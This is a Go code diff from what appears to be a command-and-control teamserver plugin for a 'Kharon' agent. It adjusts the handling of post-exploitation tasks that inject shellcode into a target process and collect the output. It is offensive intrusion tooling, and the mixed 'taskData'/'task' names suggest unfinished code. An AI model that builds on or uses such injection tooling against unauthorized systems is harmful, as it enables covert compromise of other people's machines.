@@ -2179,6 +2179,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, 0, len(params), params}
 		case "postex":
+			taskData.Type = TYPE_JOB
+			// taskData.Sync = false   			
+
 			method := args["method"].(string)
 			pid := args["pid"].(float64)
 			scfile := args["sc_file"].(string)
@@ -2214,7 +2217,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				params,
 			)
 
-			array = []interface{}{ TASK_POSTEX, 1, len(bofData), bofData, len(bofArgs), bofArgs,}
+			array = []interface{}{ TASK_POSTEX, POSTEX_ACTION_INJECT, len(bofData), bofData, len(bofArgs), bofArgs,}
 
 			// case "kill": id := args["id"].(int) array = []interface{}{TASK_POSTEX, POSTEX_KILL, PackInt32(id)}
 
@@ -2645,63 +2648,57 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 
 				case TASK_POSTEX:
 					postex_action := cmd_packer.ParseInt32()
+					fmt.Printf("task postex ")
+					fmt.Printf("action: %d\n", postex_action)
 
-					switch ( postex_action ) {
+					switch postex_action {
 					case POSTEX_ACTION_INJECT:
 						success := cmd_packer.ParseInt32()
 						if success == 1 {
 							kharon_cfg.postex_handler.PostexLoaded = true
-						} else {
-							kharon_cfg.postex_handler.PostexLoaded = false
 						}
-
 						agentData.CustomData, _ = kharon_cfg.Marshal()
 						ts.TsAgentUpdateData(agentData)
 
-						taskData.Completed = false
+						task.Completed = false        
+						
+						ts.TsAgentConsoleOutput( task.AgentId, MESSAGE_SUCCESS, "Postex module successfully injected", "", false )
+						ts.TsAgentConsoleOutput( task.AgentId, MESSAGE_SUCCESS, "Kharon will try to read during the next check-in", "", false )
 
-						case POSTEX_ACTION_POLL:
+					case POSTEX_ACTION_POLL:
 						postex_msg := cmd_packer.ParseInt32()
 
 						switch postex_msg {
 						case POSTEX_MSG_OUTPUT:
 							is_exit   := cmd_packer.ParseInt32()
 							exit_code := cmd_packer.ParseInt32()
-							output 	  := cmd_packer.ParseBytes()
-							
+							output    := cmd_packer.ParseBytes()
+
+							task.MessageType = MESSAGE_SUCCESS
+							task.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
+
 							if is_exit == 1 {
-								taskData.Completed = true
-								taskData.Message     = fmt.Sprintf("Received %d bytes of output. Process exited with code %d", len(output), exit_code)
+								task.Completed = true
+								task.Message = fmt.Sprintf("Process exited with code %d (%d bytes)", exit_code, len(output))
 							} else {
-								taskData.Message     = fmt.Sprintf("Received %d bytes of output", len(output))
+								task.Completed = false
+								task.Message = fmt.Sprintf("Received %d bytes", len(output))
 							}
 
-							taskData.MessageType = MESSAGE_INFO
-							taskData.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
+						case POSTEX_MSG_END:
+							exit_code := cmd_packer.ParseInt32()
+							task.Message     = fmt.Sprintf("Process terminated (exit: %d)", exit_code)
+							task.MessageType = MESSAGE_SUCCESS
+							task.Completed   = true
 
 						case POSTEX_MSG_RAW:
 							output := cmd_packer.ParseBytes()
-
-							taskData.Message     = fmt.Sprintf("Received %d bytes of raw output", len(output))
-							taskData.MessageType = MESSAGE_INFO
-							taskData.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
-
-							taskData.Completed = true
-							
-						case POSTEX_MSG_END: 
-							exit_code := cmd_packer.ParseInt32()
-
-							taskData.Message 	 = fmt.Sprintf("Process terminated with exit code: %d", exit_code)
-							taskData.MessageType = MESSAGE_INFO					
-
-							taskData.Completed = true
+							task.Message     = fmt.Sprintf("Raw output: %d bytes", len(output))
+							task.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)
+							task.Completed   = true
+						default:
+							task.Completed = false
 						}
-
-					case POSTEX_ACTION_LIST:
-					case POSTEX_ACTION_SUSPEND:
-					case POSTEX_ACTION_KILL:
-					case POSTEX_ACTION_RESUME:
-					case POSTEX_ACTION_CLEANUP:
 					}
 
 				case TASK_EXEC_BOF:
